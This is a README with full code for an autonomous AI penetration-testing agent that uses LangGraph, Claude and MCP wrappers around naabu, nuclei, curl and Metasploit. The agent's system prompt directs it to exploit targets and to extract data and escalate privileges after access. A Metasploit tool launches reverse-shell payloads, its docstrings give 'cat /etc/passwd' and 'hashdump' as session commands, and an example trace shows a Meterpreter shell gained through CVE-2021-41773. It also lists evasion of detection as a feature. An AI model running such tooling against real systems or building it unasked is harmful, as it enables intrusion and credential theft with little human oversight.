RLM with REPL
https://github.com/alexzhang13/rlm
https://github.com/alexzhang13/rlm-minimal
https://alexzhang13.github.io/blog/2025/rlm/?utm_source=www.theunwindai.com&utm_medium=referral&utm_campaign=claude-code-s-hidden-multi-agent-orchestration-now-open-source


# RedAmon Agentic AI - Autonomous Penetration Testing

## Overview

An agentic AI system that autonomously performs penetration testing by leveraging:
- **Neo4j Graph Database**: Text-to-Cypher queries to understand target infrastructure from recon data
- **MCP Servers**: Tool integration for naabu, curl, nuclei, and metasploit
- **Kali Linux Sandbox**: Isolated Docker environment with all security tools
- **LangGraph Agent**: ReAct-style reasoning with Thought → Tool Call → Response chains

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                            RedAmon Agentic Architecture                               │
├──────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                      │
│   USER PROMPT: "Find vulnerabilities on 10.0.0.5 and exploit them"                   │
│                                         │                                            │
│                                         ▼                                            │
│  ┌────────────────────────────────────────────────────────────────────────────────┐  │
│  │                          LANGGRAPH AGENT (ReAct)                               │  │
│  │                                                                                │  │
│  │   ┌──────────┐    ┌───────────┐    ┌──────────┐    ┌──────────┐               │  │
│  │   │ Thought  │───►│ Tool Call │───►│ Response │───►│ Thought  │───► ...       │  │
│  │   └──────────┘    └─────┬─────┘    └────▲─────┘    └──────────┘               │  │
│  │                         │               │                                      │  │
│  │   Phases: Planning ──► Scanning ──► Enumeration ──► Exploitation ──► Report   │  │
│  └─────────────────────────┼───────────────┼─────────────────────────────────────┘  │
│                            │               │                                         │
│            ┌───────────────┴───────────────┴───────────────┐                        │
│            │              MCP PROTOCOL (JSON-RPC)          │                        │
│            └───────────────┬───────────────┬───────────────┘                        │
│                            │               │                                         │
│       ┌────────────────────┴───┐       ┌───┴────────────────────────────────────┐   │
│       ▼                        │       ▼                                         │   │
│  ┌─────────────────────┐       │  ┌─────────────────────────────────────────────┐   │
│  │  NEO4J CONTAINER    │       │  │         KALI SANDBOX CONTAINER              │   │
│  │                     │       │  │                                             │   │
│  │  Text-to-Cypher     │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  ┌───────────────┐  │       │  │  │         MCP SERVERS (Python)        │   │   │
│  │  │ Graph DB      │  │       │  │  │                                     │   │   │
│  │  │               │  │       │  │  │  naabu_server ──► /usr/bin/naabu    │   │   │
│  │  │ (Host)        │  │       │  │  │  nuclei_server ─► /usr/bin/nuclei   │   │   │
│  │  │   ↓           │  │       │  │  │  curl_server ───► /usr/bin/curl     │   │   │
│  │  │ (Port)        │  │       │  │  │  msf_server ────► /usr/bin/msfconsole│  │   │
│  │  │   ↓           │  │       │  │  │                                     │   │   │
│  │  │ (Technology)  │  │       │  │  └──────────────────┬──────────────────┘   │   │
│  │  │   ↓           │  │       │  │                     │                       │   │
│  │  │ (CVE)         │  │       │  │                     ▼                       │   │
│  │  │   ↓           │  │       │  │  ┌─────────────────────────────────────┐   │   │
│  │  │ (CWE/CAPEC)   │  │       │  │  │      INSTALLED TOOLS (binaries)     │   │   │
│  │  └───────────────┘  │       │  │  │  • naabu    - port scanning         │   │   │
│  │                     │       │  │  │  • nuclei   - vuln scanning         │   │   │
│  └─────────────────────┘       │  │  │  • curl     - HTTP requests         │   │   │
│            ▲                   │  │  │  • metasploit - exploitation        │   │   │
│            │                   │  │  └─────────────────────────────────────┘   │   │
│            │                   │  │                     │                       │   │
│  ┌─────────┴─────────┐         │  │                     ▼                       │   │
│  │ RedAmon Recon     │         │  │            ┌───────────────┐                │   │
│  │ (pre-loaded data) │         │  │            │ TARGET NETWORK│                │   │
│  └───────────────────┘         │  │            │  10.0.0.0/24  │                │   │
│                                │  │            └───────────────┘                │   │
│                                │  └─────────────────────────────────────────────┘   │
│                                │                                                     │
└────────────────────────────────┴─────────────────────────────────────────────────────┘
```

### How It Works

1. **Agent decides** to call a tool (e.g., `execute_naabu("-host 10.0.0.5 -p 1-1000 -json")`)
2. **MCP Protocol** sends JSON-RPC request to the Kali container
3. **MCP Server** (Python) receives request, executes `/usr/bin/naabu -host 10.0.0.5 -p 1-1000 -json`
4. **Tool output** is captured and returned to the agent via MCP
5. **Agent reasons** about the result and decides next action

The MCP servers are **thin wrappers** that translate agent tool calls into CLI commands executed inside the Kali container where all tools are installed. For maximum flexibility, naabu/nuclei/curl use dynamic command execution, while Metasploit uses structured tools due to its stateful nature.

---

## Components

### 1. Kali Linux Sandbox (Docker)

Isolated environment with all penetration testing tools pre-installed.

**Dockerfile:**
```dockerfile
FROM kalilinux/kali-rolling:latest

RUN apt-get update && apt-get install -y \
    nmap \
    naabu \
    nuclei \
    curl \
    metasploit-framework \
    python3 \
    python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Install MCP server dependencies
RUN pip3 install mcp fastmcp

# Copy MCP servers
COPY mcp_servers/ /opt/mcp_servers/

WORKDIR /opt/mcp_servers

EXPOSE 8000-8003

CMD ["python3", "run_all_servers.py"]
```

**docker-compose.yml:**
```yaml
version: '3.8'

services:
  kali-sandbox:
    build: ./kali-sandbox
    container_name: redamon-kali
    networks:
      - pentest-net
    cap_add:
      - NET_ADMIN
      - NET_RAW
    ports:
      - "8000:8000"  # naabu MCP
      - "8001:8001"  # curl MCP
      - "8002:8002"  # nuclei MCP
      - "8003:8003"  # metasploit MCP
    volumes:
      - ./mcp_servers:/opt/mcp_servers
      - ./output:/opt/output

  neo4j:
    image: neo4j:5-community
    container_name: redamon-neo4j
    environment:
      - NEO4J_AUTH=neo4j/redamon123
    ports:
      - "7474:7474"
      - "7687:7687"
    volumes:
      - neo4j_data:/data

  agent:
    build: ./agent
    container_name: redamon-agent
    depends_on:
      - kali-sandbox
      - neo4j
    environment:
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - NEO4J_URI=bolt://neo4j:7687
      - NEO4J_USER=neo4j
      - NEO4J_PASSWORD=redamon123
    networks:
      - pentest-net

networks:
  pentest-net:
    driver: bridge

volumes:
  neo4j_data:
```

---

### 2. MCP Servers

MCP servers expose penetration testing tools to the AI agent. We use two approaches:

1. **Dynamic CLI Wrappers** (naabu, nuclei, curl): Generic `execute` + `help` tools that accept raw CLI arguments. This maximizes flexibility since LLMs know these tools from training data.

2. **Structured Tools** (metasploit): Specific tools for each function because Metasploit is stateful (sessions, listeners) and benefits from explicit parameter handling.

#### Tool Design Philosophy

| Server | Approach | Rationale |
|--------|----------|-----------|
| naabu | Dynamic (`execute` + `help`) | Simple CLI, LLM knows flags |
| nuclei | Dynamic (`execute` + `help`) | Many templates/options, flexible |
| curl | Dynamic (`execute` + `help`) | Countless flags, LLM expertise |
| metasploit | Structured (7 specific tools) | Stateful, sessions, complex workflows |

---

**mcp_servers/naabu_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("naabu")

@mcp.tool()
def execute_naabu(args: str) -> str:
    """
    Execute naabu port scanner with any valid CLI arguments.

    Args:
        args: Command-line arguments for naabu (without the 'naabu' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-host 10.0.0.5 -p 1-1000 -rate 1000 -json"
        - "-host 192.168.1.0/24 -top-ports 100 -json"
        - "-list targets.txt -p 22,80,443,8080 -json"
        - "-host 10.0.0.5 -p 80,443 -nmap-cli 'nmap -sV'"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["naabu"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def naabu_help() -> str:
    """
    Get naabu help and usage information.
    Use this to discover available flags and options.

    Returns:
        Naabu help output with all available options
    """
    result = subprocess.run(
        ["naabu", "-help"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/nuclei_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("nuclei")

@mcp.tool()
def execute_nuclei(args: str) -> str:
    """
    Execute nuclei vulnerability scanner with any valid CLI arguments.

    Args:
        args: Command-line arguments for nuclei (without the 'nuclei' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-u http://10.0.0.5 -severity critical,high -jsonl"
        - "-u http://10.0.0.5 -id CVE-2021-41773 -jsonl"
        - "-u http://10.0.0.5 -tags cve,rce -jsonl"
        - "-l urls.txt -severity critical -jsonl"
        - "-u http://10.0.0.5 -t /path/to/template.yaml"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["nuclei"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 600 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def nuclei_help() -> str:
    """
    Get nuclei help and usage information.
    Use this to discover available flags, template options, and severity levels.

    Returns:
        Nuclei help output with all available options
    """
    result = subprocess.run(
        ["nuclei", "-help"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/curl_server.py:**
```python
from fastmcp import FastMCP
import subprocess
import shlex

mcp = FastMCP("curl")

@mcp.tool()
def execute_curl(args: str) -> str:
    """
    Execute curl HTTP client with any valid CLI arguments.

    Args:
        args: Command-line arguments for curl (without the 'curl' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        - "-s -i http://10.0.0.5/"
        - "-s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"admin\"}' http://10.0.0.5/api/login"
        - "-s -I http://10.0.0.5/ -H 'User-Agent: Mozilla/5.0'"
        - "-s -k https://10.0.0.5/ --connect-timeout 10"
        - "-s -o /dev/null -w '%{http_code}' http://10.0.0.5/"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["curl"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 60 seconds"
    except Exception as e:
        return f"[ERROR] {str(e)}"

@mcp.tool()
def curl_help() -> str:
    """
    Get curl help and usage information.
    Use this to discover available flags and options.

    Returns:
        Curl help output with common options
    """
    result = subprocess.run(
        ["curl", "--help", "all"],
        capture_output=True,
        text=True
    )
    return result.stdout + result.stderr

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

**mcp_servers/metasploit_server.py:**

Metasploit uses structured tools because it's stateful (maintains sessions, listeners) and requires careful parameter handling for exploits.

```python
from fastmcp import FastMCP
import subprocess
from typing import Optional

mcp = FastMCP("metasploit")

@mcp.tool()
def metasploit_search(query: str) -> str:
    """
    Search for Metasploit modules (exploits, payloads, auxiliaries).

    Args:
        query: Search query (e.g., "struts", "CVE-2017-5638", "type:exploit platform:linux")

    Returns:
        List of matching modules with their ranks and descriptions

    Examples:
        - "apache struts"
        - "CVE-2017-5638"
        - "type:exploit platform:windows smb"
        - "type:auxiliary scanner http"
    """
    cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return result.stdout

@mcp.tool()
def metasploit_info(module_name: str) -> str:
    """
    Get detailed information about a Metasploit module.

    Args:
        module_name: Full module path (e.g., "exploit/multi/http/struts2_content_type_ognl")

    Returns:
        Module description, options, targets, and references
    """
    cmd = ["msfconsole", "-q", "-x", f"info {module_name}; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return result.stdout

@mcp.tool()
def metasploit_module_payloads(module_name: str) -> str:
    """
    List compatible payloads for an exploit module.

    Args:
        module_name: Full exploit module path

    Returns:
        List of compatible payloads that can be used with this exploit
    """
    commands = f"use {module_name}; show payloads; exit"
    cmd = ["msfconsole", "-q", "-x", commands]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return result.stdout

@mcp.tool()
def metasploit_payload_info(payload_name: str) -> str:
    """
    Get detailed information about a payload.

    Args:
        payload_name: Full payload path (e.g., "linux/x64/meterpreter/reverse_tcp")

    Returns:
        Payload description, options (LHOST, LPORT, etc.), and platform info
    """
    cmd = ["msfconsole", "-q", "-x", f"info payload/{payload_name}; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return result.stdout

@mcp.tool()
def metasploit_exploit(
    module: str,
    rhosts: str,
    rport: int,
    payload: str,
    lhost: str,
    lport: int,
    extra_options: Optional[str] = None
) -> str:
    """
    Execute a Metasploit exploit with specified payload.

    Args:
        module: Exploit module path (e.g., "multi/http/struts2_content_type_ognl")
        rhosts: Target IP address or hostname
        rport: Target port number
        payload: Payload to deliver (e.g., "linux/x64/meterpreter/reverse_tcp")
        lhost: Listener IP address (your attacking machine)
        lport: Listener port number
        extra_options: Additional options as "KEY=VALUE; KEY2=VALUE2" (optional)

    Returns:
        Exploit execution output including session info if successful
    """
    commands = f"""
use {module}
set RHOSTS {rhosts}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
"""
    if extra_options:
        for opt in extra_options.split(";"):
            opt = opt.strip()
            if opt:
                commands += f"set {opt}\n"

    commands += """
exploit -j
sleep 5
sessions -l
exit
"""
    cmd = ["msfconsole", "-q", "-x", commands]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    return result.stdout

@mcp.tool()
def metasploit_sessions() -> str:
    """
    List all active Metasploit sessions.

    Returns:
        Table of active sessions with ID, type, connection info, and target details
    """
    cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return result.stdout

@mcp.tool()
def metasploit_session_interact(session_id: int, command: str, timeout: int = 30) -> str:
    """
    Execute a command on an active Metasploit session.

    Args:
        session_id: Session ID from metasploit_sessions()
        command: Command to execute (e.g., "whoami", "cat /etc/passwd", "sysinfo")
        timeout: Command timeout in seconds (default: 30)

    Returns:
        Command output from the compromised target

    Examples:
        - session_id=1, command="whoami"
        - session_id=1, command="cat /etc/passwd"
        - session_id=1, command="sysinfo" (for meterpreter)
        - session_id=1, command="hashdump" (for meterpreter with privileges)
    """
    cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id} -c '{command}'; exit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
    return result.stdout

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

---

### 3. Text-to-Cypher (Neo4j Integration)

Query recon data stored in Neo4j using natural language.

**agent/text_to_cypher.py:**
```python
from langchain_anthropic import ChatAnthropic
from langchain_neo4j import Neo4jGraph, GraphCypherQAChain

CYPHER_GENERATION_PROMPT = """
You are a Neo4j Cypher expert. Generate Cypher queries based on the user's question.

Schema:
{schema}

The graph contains recon data with these node types:
- (Host) - IP addresses and hostnames
- (Port) - Open ports with services
- (Technology) - Detected technologies with versions
- (Vulnerability) - CVEs with severity and CVSS
- (CWE) - Weakness types from MITRE
- (CAPEC) - Attack patterns

Relationships:
- (Host)-[:HAS_PORT]->(Port)
- (Host)-[:RUNS]->(Technology)
- (Technology)-[:HAS_CVE]->(Vulnerability)
- (Vulnerability)-[:HAS_CWE]->(CWE)
- (CWE)-[:ATTACKED_BY]->(CAPEC)

Question: {question}

Return only the Cypher query, no explanation.
"""

class TextToCypher:
    def __init__(self, neo4j_uri: str, neo4j_user: str, neo4j_password: str):
        self.graph = Neo4jGraph(
            url=neo4j_uri,
            username=neo4j_user,
            password=neo4j_password
        )
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.chain = GraphCypherQAChain.from_llm(
            llm=self.llm,
            graph=self.graph,
            verbose=True,
            cypher_prompt=CYPHER_GENERATION_PROMPT
        )

    def query(self, question: str) -> str:
        """Convert natural language to Cypher and execute."""
        return self.chain.invoke({"query": question})

    def get_exploitable_targets(self) -> list:
        """Find hosts with critical vulnerabilities that have known exploits."""
        cypher = """
        MATCH (h:Host)-[:HAS_PORT]->(p:Port)-[:RUNS]->(t:Technology)-[:HAS_CVE]->(v:Vulnerability)
        WHERE v.severity = 'CRITICAL' AND v.has_exploit = true
        RETURN h.ip as target, p.number as port, t.name as technology,
               v.id as cve, v.cvss as cvss
        ORDER BY v.cvss DESC
        """
        return self.graph.query(cypher)
```

---

### 4. LangGraph Agent (ReAct Pattern)

The core agent using LangGraph for Thought → Tool Call → Response chains.

**agent/pentest_agent.py:**
```python
from typing import Annotated, TypedDict
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, AIMessage, ToolMessage
from langchain_mcp import MCPToolkit

from text_to_cypher import TextToCypher

class AgentState(TypedDict):
    messages: list
    current_phase: str  # planning, scanning, enumeration, exploitation, reporting
    target: str
    findings: dict

class PentestAgent:
    def __init__(self, mcp_servers: list, neo4j_config: dict):
        self.llm = ChatAnthropic(model="claude-sonnet-4-20250514")
        self.text_to_cypher = TextToCypher(**neo4j_config)

        # Load MCP tools
        self.toolkit = MCPToolkit(servers=mcp_servers)
        self.tools = self.toolkit.get_tools() + [self._create_cypher_tool()]

        self.llm_with_tools = self.llm.bind_tools(self.tools)
        self.graph = self._build_graph()

    def _create_cypher_tool(self):
        from langchain_core.tools import tool

        @tool
        def query_recon_data(question: str) -> str:
            """
            Query the Neo4j graph database containing recon data.
            Use natural language to ask about hosts, ports, technologies,
            vulnerabilities, and their relationships.

            Examples:
            - "What hosts have critical vulnerabilities?"
            - "Show all open ports on 10.0.0.5"
            - "Which technologies have known exploits?"
            """
            return self.text_to_cypher.query(question)

        return query_recon_data

    def _build_graph(self) -> StateGraph:
        workflow = StateGraph(AgentState)

        # Nodes
        workflow.add_node("agent", self._agent_node)
        workflow.add_node("tools", ToolNode(self.tools))

        # Edges
        workflow.set_entry_point("agent")
        workflow.add_conditional_edges(
            "agent",
            self._should_continue,
            {
                "tools": "tools",
                "end": END
            }
        )
        workflow.add_edge("tools", "agent")

        return workflow.compile()

    def _agent_node(self, state: AgentState) -> AgentState:
        """Main reasoning node - generates thoughts and tool calls."""

        system_prompt = """You are an autonomous penetration testing agent.

Your goal is to find and exploit vulnerabilities on the target system.

You have access to these tools:

**Reconnaissance & Scanning (Dynamic CLI):**
- execute_naabu(args): Port scanning - pass any naabu CLI arguments
- naabu_help(): Get naabu usage information
- execute_nuclei(args): Vulnerability scanning - pass any nuclei CLI arguments
- nuclei_help(): Get nuclei usage information
- execute_curl(args): HTTP requests - pass any curl CLI arguments
- curl_help(): Get curl usage information

**Knowledge Base:**
- query_recon_data(question): Query Neo4j for existing recon data (hosts, ports, CVEs)

**Exploitation (Structured Tools):**
- metasploit_search(query): Find exploits for vulnerabilities
- metasploit_info(module_name): Get exploit module details
- metasploit_module_payloads(module_name): List compatible payloads
- metasploit_payload_info(payload_name): Get payload details
- metasploit_exploit(module, rhosts, rport, payload, lhost, lport): Execute exploits
- metasploit_sessions(): List active sessions
- metasploit_session_interact(session_id, command): Run commands on compromised hosts

Follow this methodology:
1. PLANNING: Query recon data to understand the target infrastructure
2. SCANNING: Use execute_naabu to discover ports (e.g., "-host TARGET -p 1-1000 -json")
3. ENUMERATION: Use execute_curl and execute_nuclei to find vulnerabilities
4. EXPLOITATION: Use metasploit tools to exploit discovered vulnerabilities
5. POST-EXPLOITATION: Use metasploit_session_interact to extract data, escalate privileges

Always think step-by-step. Explain your reasoning before each action.
If unsure about tool flags, use the _help tools to discover options.
"""

        messages = [{"role": "system", "content": system_prompt}] + state["messages"]
        response = self.llm_with_tools.invoke(messages)

        return {"messages": state["messages"] + [response]}

    def _should_continue(self, state: AgentState) -> str:
        """Determine if agent should continue or finish."""
        last_message = state["messages"][-1]
        if hasattr(last_message, "tool_calls") and last_message.tool_calls:
            return "tools"
        return "end"

    def run(self, objective: str, target: str) -> dict:
        """Execute the penetration test."""
        initial_state = {
            "messages": [HumanMessage(content=f"""
Target: {target}
Objective: {objective}

Begin the penetration test. First, query the recon database to understand
what we already know about this target.
""")],
            "current_phase": "planning",
            "target": target,
            "findings": {}
        }

        final_state = self.graph.invoke(initial_state)
        return final_state
```

---

## Usage

### 1. Start the Environment

```bash
# Start all containers
docker-compose up -d

# Wait for services to be ready
docker-compose logs -f
```

### 2. Load Recon Data into Neo4j

```bash
# Run existing RedAmon recon
python recon/main.py

# Load results into Neo4j
python graph_db/update_graph_from_json.py
```

### 3. Run the Agent

```python
from agent.pentest_agent import PentestAgent

agent = PentestAgent(
    mcp_servers=[
        {"name": "naabu", "url": "http://localhost:8000"},
        {"name": "nuclei", "url": "http://localhost:8002"},
        {"name": "curl", "url": "http://localhost:8001"},
        {"name": "metasploit", "url": "http://localhost:8003"},
    ],
    neo4j_config={
        "neo4j_uri": "bolt://localhost:7687",
        "neo4j_user": "neo4j",
        "neo4j_password": "redamon123"
    }
)

result = agent.run(
    objective="Find and exploit vulnerabilities to gain shell access",
    target="10.0.0.5"
)
```

---

## Example Agent Execution Trace

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER: Find vulnerabilities on 10.0.0.5 and attempt to exploit them             │
└─────────────────────────────────────────────────────────────────────────────────┘

Step 1 - PLANNING
├── Thought: I need to understand what we already know about this target from recon
├── Tool:    query_recon_data("What do we know about host 10.0.0.5?")
└── Response: Host has ports 22, 80, 443 open. Running Apache 2.4.49.
              CVE-2021-41773 detected (Path Traversal, CVSS 7.5)

Step 2 - SCANNING (verify with fresh scan)
├── Thought: Let me verify the open ports with a fresh scan
├── Tool:    execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
└── Response: {"host":"10.0.0.5","port":22} {"host":"10.0.0.5","port":80} ...

Step 3 - ENUMERATION
├── Thought: CVE-2021-41773 is a path traversal in Apache 2.4.49. Let me verify.
├── Tool:    execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
└── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CONFIRMED

Step 4 - EXPLOITATION RESEARCH
├── Thought: Let me search for exploits for this CVE
├── Tool:    metasploit_search("CVE-2021-41773")
└── Response: exploit/multi/http/apache_normalize_path_rce (Excellent)

Step 5 - EXPLOITATION PREP
├── Thought: Let me get info about this exploit and find compatible payloads
├── Tool:    metasploit_info("exploit/multi/http/apache_normalize_path_rce")
├── Tool:    metasploit_module_payloads("exploit/multi/http/apache_normalize_path_rce")
└── Response: Compatible payloads: linux/x64/meterpreter/reverse_tcp, cmd/unix/reverse_bash...

Step 6 - EXPLOITATION
├── Thought: Found an RCE exploit. Configuring and launching...
├── Tool:    metasploit_exploit(
│                module="multi/http/apache_normalize_path_rce",
│                rhosts="10.0.0.5", rport=80,
│                payload="linux/x64/meterpreter/reverse_tcp",
│                lhost="10.0.0.10", lport=4444
│            )
└── Response: [*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:45892)

Step 7 - POST-EXPLOITATION
├── Thought: Shell obtained. Checking current user and extracting data.
├── Tool:    metasploit_session_interact(session_id=1, command="whoami")
└── Response: www-data

Step 8 - REPORTING
└── Thought: Successfully exploited CVE-2021-41773 and obtained shell access as
             www-data. The target is vulnerable to path traversal leading to RCE.
```

---

## Key Dependencies

```
# requirements.txt
langchain>=0.3.0
langchain-anthropic>=0.3.0
langchain-neo4j>=0.1.0
langgraph>=0.2.0
langchain-mcp>=0.1.0
mcp>=1.0.0
fastmcp>=0.1.0
neo4j>=5.0.0
```

---

## Security Considerations

1. **Isolated Network**: The Kali sandbox runs in an isolated Docker network
2. **Authorization Required**: Only run against systems you have permission to test
3. **Audit Logging**: All agent actions are logged for review
4. **Rate Limiting**: Tool calls include rate limiting to avoid detection
5. **Kill Switch**: Agent can be terminated at any time via API

---

## Roadmap

- [ ] Add more MCP servers (gobuster, sqlmap, hydra)
- [ ] Implement multi-agent coordination (scanner agent, exploiter agent)
- [ ] Add reporting agent for automatic report generation
- [ ] Integrate with MITRE ATT&CK for tactic/technique mapping
- [ ] Add memory/context persistence across sessions
